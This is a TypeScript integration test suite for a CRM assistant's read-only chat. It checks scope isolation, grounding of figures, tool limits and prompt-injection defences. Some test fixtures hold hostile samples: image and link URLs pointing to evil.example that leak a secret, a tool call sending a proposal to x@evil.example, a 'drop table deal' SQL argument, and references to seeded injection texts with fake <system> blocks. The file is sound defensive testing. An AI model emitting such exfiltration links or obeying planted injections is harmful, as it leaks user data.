/**
 * Kensium Copilot — read-only chat against a REAL PostgreSQL test database, through the real HTTP routes (SSE).
 * The mock AI is injected at the AiProvider port: scripted steps where a test needs an exact sequence, the built-in
 * planner otherwise. Data: the Avengers demo seed (with its canary records and planted injection texts).
 */
import { eq } from 'drizzle-orm';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { createKit, hasTestDb, PASSWORD, type SseEvent } from './copilot-test-kit.ts';
import { agentRun, copilotConversation } from './db/schema-copilot.ts';
import { purgeExpiredConversations } from './modules/copilot/conversations.ts';
import { CANARIES, INJECTIONS, seedCopilotDemo, seedId } from './modules/copilot/demo-seed.ts';
import { hasInvisible } from './modules/copilot/text.ts';
import { runScheduledScans } from './modules/workflow.ts';
import { schema } from './platform/core.ts';
import { type AiConverseRequest, AiProviderError } from './platform/ports.ts';

const texts = (events: SseEvent[], name: string) => events.filter((e) => e.event === name);
const done = (events: SseEvent[]) => events.find((e) => e.event === 'done')?.data;
/** Everything the "model" was sent in a request, as one string (for privacy assertions). */
const sent = (req: AiConverseRequest | undefined) => JSON.stringify([req?.system, req?.messages, req?.tools]);

describe.skipIf(!hasTestDb())('Copilot chat, read-only (PostgreSQL integration)', () => {
  const kit = createKit('Copilot Chat Org');
  const start = async (who: string, context?: { type: string; id: string }) => {
    const c = await kit.call(who, 'POST', '/copilot/conversations', context ? { context } : {});
    expect(c.status, c.text).toBe(201);
    return c.json.id as string;
  };
  const ask = async (who: string, message: string, opts: { conversation?: string; context?: { type: string; id: string } } = {}) => {
    const id = opts.conversation ?? (await start(who, opts.context));
    const res = await kit.sse(who, `/copilot/conversations/${id}/turns`, { message });
    return { ...res, id, done: done(res.events) };
  };

  beforeAll(async () => {
    await kit.reset();
    await seedCopilotDemo(kit.ctx, { password: PASSWORD });
    for (const [key, email] of [
      ['spidey', 'spider.man'],
      ['hawkeye', 'hawkeye'],
      ['gamora', 'gamora'],
      ['rocket', 'rocket'],
      ['cap', 'captain.america'],
      ['starlord', 'star.lord'],
    ])
      await kit.signIn(key as string, `${email}@northwind.example`);
  }, 120_000);
  beforeEach(() => {
    kit.ai.reset();
    kit.clock.now = new Date(kit.clock.now.getTime() + 61_000); // each test starts outside the per-minute window
  });
  afterAll(async () => {
    await kit.pool.end();
  });

  it('answers a question as a stream: status, tool lines, text, then a checked answer with sources', async () => {
    kit.ai.enqueueConverse({ text: 'Let me look.', toolCalls: [{ name: 'list_deals', input: { status: 'open', limit: 3 } }] }, (req) => {
      const result = JSON.parse((req.messages.at(-1)?.content[0] as { content: string } | undefined)?.content ?? '{}');
      return { text: `You have ${result.total} open deals. The latest is ${result.rows[0].name} [${result.rows[0].ref}].` };
    });
    const r = await ask('spidey', 'How many open deals do I have?');
    expect(r.status).toBe(200);
    expect(r.contentType).toContain('text/event-stream');
    expect(r.events[0]).toEqual({ event: 'status', data: { text: 'Thinking…' } });
    expect(texts(r.events, 'tool').map((e) => `${e.data.name}:${e.data.status}`)).toEqual(['list_deals:started', 'list_deals:done']);
    expect(texts(r.events, 'status').map((e) => e.data.text)).toContain('Looking at your deals…');
    expect(texts(r.events, 'reset')).toHaveLength(1); // the "Let me look." preamble is cleared
    expect(r.done.status).toBe('completed');
    expect(r.done.answer).toMatch(/^You have \d+ open deals\./);
    expect(r.done.sources).toHaveLength(1);
    expect(r.done.sources[0]).toMatchObject({ alias: 'D1', type: 'deal' });
    // The source id is a real deal that Spider-Man owns.
    const [deal] = await kit.ctx.db.select().from(schema.deal).where(eq(schema.deal.id, r.done.sources[0].id));
    const [spidey] = await kit.ctx.db.select().from(schema.appUserProfile).where(eq(schema.appUserProfile.fullName, 'Spider-Man'));
    expect(deal?.ownerId).toBe(spidey?.userId);

    const [run] = await kit.ctx.db.select().from(agentRun).where(eq(agentRun.id, r.done.runId));
    expect(run).toMatchObject({ kind: 'chat', status: 'completed', steps: 2, toolCalls: 1, principalRole: 'salesperson', simulated: true, tainted: false });
    expect(run?.firstTokenMs).not.toBeNull();

    const stored = await kit.call('spidey', 'GET', `/copilot/conversations/${r.id}`);
    expect(stored.json.messages.map((m: { role: string }) => m.role)).toEqual(['user', 'assistant']);
    expect(stored.json.messages[1].text).toBe(r.done.answer);
    expect(stored.json.title).toBe('How many open deals do I have?');
  });

  it('a pipeline figure in the answer equals what the reports screen shows for that user', async () => {
    const report = await kit.call('spidey', 'GET', '/reports/overview');
    const r = await ask('spidey', 'What is my pipeline and weighted forecast?');
    expect(r.done.status).toBe('completed');
    expect(r.done.flags).not.toContain('unverified_figures');
    expect(r.done.answer).toContain(`value ${report.json.pipelineTotals.value}`);
    expect(r.done.answer).toContain(`weighted forecast ${report.json.pipelineTotals.weighted}`);
    expect(kit.ai.converseCalls[0]?.tools.map((t) => t.name)).toContain('pipeline_report');
  });

  it('keeps the system prompt and tool list identical between turns, and sends earlier turns as history', async () => {
    const first = await ask('spidey', 'Show my stalled deals');
    const second = await ask('spidey', 'And my tasks?', { conversation: first.id });
    const [a, b] = [kit.ai.converseCalls[0], kit.ai.converseCalls.at(-1)];
    expect(a?.system).toBe(b?.system);
    expect(JSON.stringify(a?.tools)).toBe(JSON.stringify(b?.tools));
    expect(a?.system).not.toMatch(/\d{4}-\d{2}-\d{2}/); // no dates in the cached prefix
    const history = JSON.stringify(b?.messages);
    expect(history).toContain('Show my stalled deals');
    expect(history).toContain('<session>');
    expect(second.done.status).toBe('completed');
    // A salesperson is not offered the admin-only tool.
    expect(a?.tools.map((t) => t.name)).not.toContain('sales_brief_latest');
  });

  it('never shows a record outside the user scope: canaries stay invisible and are reported as "can\'t see"', async () => {
    const probes: [string, string, string][] = [
      ['spidey', 'Tell me about "Sakaar"', CANARIES.guardiansDeal],
      ['spidey', 'Tell me about "Knowhere"', CANARIES.guardiansLead],
      ['cap', 'Tell me about "Asgard vault"', CANARIES.deactivatedRepDeal],
      ['cap', 'Tell me about "Sakaar"', CANARIES.guardiansDeal],
    ];
    for (const [who, question] of probes) {
      kit.ai.reset();
      const r = await ask(who, question);
      expect(r.done.answer, question).toMatch(/can't see that/i);
      const everything = r.text + kit.ai.converseCalls.map(sent).join('');
      for (const token of Object.values(CANARIES)) expect(everything, `${who}: ${question}`).not.toContain(token);
    }
    // Listing everything a manager may see contains no Guardians or deactivated-rep canary either.
    kit.ai.reset();
    kit.ai.enqueueConverse(
      {
        toolCalls: [
          { name: 'list_deals', input: { limit: 25 } },
          { name: 'list_leads', input: { limit: 25 } },
          { name: 'search_records', input: { query: 'CNRY' } },
        ],
      },
      { text: 'Listed.' },
    );
    const all = await ask('cap', 'List everything');
    expect(all.text + kit.ai.converseCalls.map(sent).join('')).not.toMatch(/CNRY-/);
    // The owner does see her own canary lead (the scope works both ways).
    kit.ai.reset();
    const own = await ask('gamora', 'Tell me about "Knowhere"');
    expect(kit.ai.converseCalls.map(sent).join('')).toContain(CANARIES.guardiansLead);
    expect(own.done.status).toBe('completed');
  });

  it('a conversation belongs to its owner: another user gets 404 for reading, continuing and deleting it', async () => {
    const id = await start('spidey');
    expect((await kit.call('cap', 'GET', `/copilot/conversations/${id}`)).status).toBe(404);
    expect((await kit.sse('cap', `/copilot/conversations/${id}/turns`, { message: 'hi' })).status).toBe(404);
    expect((await kit.call('admin', 'DELETE', `/copilot/conversations/${id}`)).status).toBe(404);
    expect((await kit.call('cap', 'GET', '/copilot/conversations')).json.items.map((c: { id: string }) => c.id)).not.toContain(id);
    expect((await kit.call('spidey', 'DELETE', `/copilot/conversations/${id}`)).status).toBe(200);
    expect((await kit.call('spidey', 'GET', `/copilot/conversations/${id}`)).status).toBe(404);
  });

  it('a number that no tool returned is regenerated once, then flagged', async () => {
    kit.ai.enqueueConverse({ toolCalls: [{ name: 'kpis', input: {} }] }, { text: 'You won 987654 deals.' }, { text: 'You won 987655 deals.' });
    const r = await ask('spidey', 'How many deals did I win?');
    expect(r.done.flags).toContain('unverified_figures');
    expect(r.done.answer).toContain('could not check these figures');
    expect(texts(r.events, 'status').map((e) => e.data.text)).toContain('Checking the figures…');
    const [run] = await kit.ctx.db.select().from(agentRun).where(eq(agentRun.id, r.done.runId));
    expect(run?.groundingFailures).toBe(2);

    kit.ai.reset();
    kit.clock.now = new Date(kit.clock.now.getTime() + 61_000);
    kit.ai.enqueueConverse({ toolCalls: [{ name: 'kpis', input: {} }] }, { text: 'You won 424242 deals.' }, (req) => {
      const k = JSON.parse(
        (req.messages.find((m) => m.content.some((b) => b.type === 'tool_result'))?.content[0] as { content: string } | undefined)?.content ?? '{}',
      );
      return { text: `You won ${k.dealsWon} deals.` };
    });
    const fixed = await ask('spidey', 'How many deals did I win?');
    expect(fixed.done.flags).not.toContain('unverified_figures');
    expect(fixed.done.answer).toMatch(/^You won \d+ deals\.$/);
  });

  it('answers are plain text: images, links, web addresses and HTML are removed', async () => {
    kit.ai.enqueueConverse({
      text: 'Here you go ![logo](https://evil.example/p.png?d=secret) and [click](https://evil.example/x) or http://evil.example/collect <img src="https://evil.example/a.gif"> done.',
    });
    const r = await ask('spidey', 'hello');
    expect(r.done.answer).not.toMatch(/https?:|evil\.example|<img|!\[/);
    expect(r.done.answer).toContain('click');
    expect(r.done.flags).toContain('links_or_images_removed');
    // The corrected text replaces what was streamed.
    expect(texts(r.events, 'reset').length).toBeGreaterThan(0);
  });

  it('outside text reaches the model only cleaned and inside a nonce-tagged block, and taints the turn', async () => {
    // A lead whose notes try to instruct the agent (owned by Gamora).
    const noted = await ask('gamora', 'Summarise this lead', { context: { type: 'lead', id: seedId('lead:4') } });
    expect(noted.done.tainted).toBe(true);
    expect(noted.done.flags).toContain('outside_text_looked_like_instructions');
    const toolResult = JSON.stringify(kit.ai.converseCalls.at(-1)?.messages);
    expect(toolResult).toMatch(/untrusted_document_[0-9a-f]{16} source=\\*"lead notes\\*"/);
    const [run] = await kit.ctx.db.select().from(agentRun).where(eq(agentRun.id, noted.done.runId));
    expect(run).toMatchObject({ tainted: true });
    expect(run?.injectionFlags).toBeGreaterThan(0);

    // A job title written like an instruction is withheld from the facts.
    kit.ai.reset();
    await ask('gamora', 'Summarise this lead', { context: { type: 'lead', id: seedId('lead:9') } });
    const second = JSON.stringify(kit.ai.converseCalls.at(-1)?.messages);
    expect(second).toContain('[withheld: this field contains text written like an instruction]');

    // Hidden Unicode in an imported note never reaches the model (owned by Hawkeye).
    kit.ai.reset();
    await ask('hawkeye', 'Summarise this lead', { context: { type: 'lead', id: seedId('lead:7') } });
    const third = kit.ai.converseCalls.map(sent).join('');
    expect(hasInvisible(third)).toBe(false);
    expect(third).toContain('Met at the trade show');
    expect(INJECTIONS.hiddenUnicode.length).toBeGreaterThan(60);
  });

  it('a fooled model cannot fake a closing tag or make a link appear', async () => {
    kit.ai.mode = 'gullible';
    // The lost deal whose "buyer reason" contains a fake closing tag and a fake <system> block (owned by Rocket).
    const r = await ask('rocket', 'Summarise this deal', { context: { type: 'deal', id: seedId('deal:70') } });
    const model = kit.ai.converseCalls.map(sent).join('');
    expect(model).not.toContain('<system>');
    expect(model).not.toMatch(/<\/untrusted_document>/);
    expect(r.done.answer).not.toMatch(/https?:|evil\.example|<img|!\[/);
    expect(r.done.tainted).toBe(true);
  });

  it('stops at 8 model steps and 12 tool calls', async () => {
    kit.ai.enqueueConverse(...Array.from({ length: 9 }, () => ({ toolCalls: [{ name: 'list_users', input: {} }] })));
    const steps = await ask('spidey', 'loop forever');
    const [run] = await kit.ctx.db.select().from(agentRun).where(eq(agentRun.id, steps.done.runId));
    expect(run?.steps).toBe(8);
    expect(run?.toolCalls).toBe(7); // the eighth step was offered no tools
    expect(kit.ai.converseCalls.at(-1)?.tools).toEqual([]);

    kit.ai.reset();
    kit.clock.now = new Date(kit.clock.now.getTime() + 61_000);
    kit.ai.enqueueConverse({ toolCalls: Array.from({ length: 14 }, () => ({ name: 'list_users', input: {} })) }, { text: 'Done.' });
    const many = await ask('spidey', 'many calls');
    const [run2] = await kit.ctx.db.select().from(agentRun).where(eq(agentRun.id, many.done.runId));
    expect(run2?.toolCalls).toBe(12);
    expect(JSON.stringify(kit.ai.converseCalls.at(-1)?.messages)).toContain('tool_limit_reached');
  });

  it('rejects unknown tools, tools of another role and invalid arguments without running anything', async () => {
    kit.ai.enqueueConverse(
      {
        toolCalls: [
          { name: 'send_proposal', input: { to: 'x@evil.example' } },
          { name: 'sales_brief_latest', input: {} },
          { name: 'list_deals', input: { status: 'open', sql: 'drop table deal' } },
        ],
      },
      { text: 'Nothing done.' },
    );
    const r = await ask('spidey', 'try things');
    const results = JSON.stringify(kit.ai.converseCalls.at(-1)?.messages.filter((m) => m.content.some((b) => b.type === 'tool_result')));
    expect(results.match(/unknown_tool/g)).toHaveLength(2);
    expect(results).toContain('invalid_input');
    expect(r.done.status).toBe('completed');
  });

  it('when the Copilot is off or the AI is down, the user gets a clear message and the CRM keeps working', async () => {
    const [org] = await kit.ctx.db.select().from(schema.organizationSettings);
    await kit.ctx.db.update(schema.organizationSettings).set({ copilotSettings: { roles: { salesperson: false } } });
    const off = await ask('spidey', 'hello');
    expect(texts(off.events, 'error')[0]?.data).toMatchObject({ code: 'AI_DISABLED' });
    expect(kit.ai.converseCalls).toHaveLength(0);
    expect((await ask('cap', 'hello')).done.status).toBe('completed'); // other roles are unaffected
    await kit.ctx.db.update(schema.organizationSettings).set({ copilotSettings: org?.copilotSettings ?? {} });

    kit.ai.reset();
    kit.ai.enqueueConverse(new AiProviderError('auth', 'bad key'));
    const down = await ask('spidey', 'hello');
    expect(texts(down.events, 'error')[0]?.data).toMatchObject({ code: 'AI_PROVIDER_UNAVAILABLE' });
    expect(down.done.status).toBe('failed');
    expect((await kit.call('spidey', 'GET', '/deals?limit=1')).status).toBe(200);
  });

  it('removes conversations after the retention period', async () => {
    const id = await start('spidey');
    expect(await purgeExpiredConversations(kit.ctx)).toBe(0);
    kit.clock.now = new Date(kit.clock.now.getTime() + 31 * 86_400_000);
    expect((await kit.call('spidey', 'GET', `/copilot/conversations/${id}`)).status).toBe(404); // expired even before the purge runs
    expect((await runScheduledScans(kit.ctx)).copilot.conversationsPurged).toBeGreaterThan(0); // the nightly scans purge
    expect(await kit.ctx.db.select().from(copilotConversation).where(eq(copilotConversation.id, id))).toHaveLength(0);
  });
});
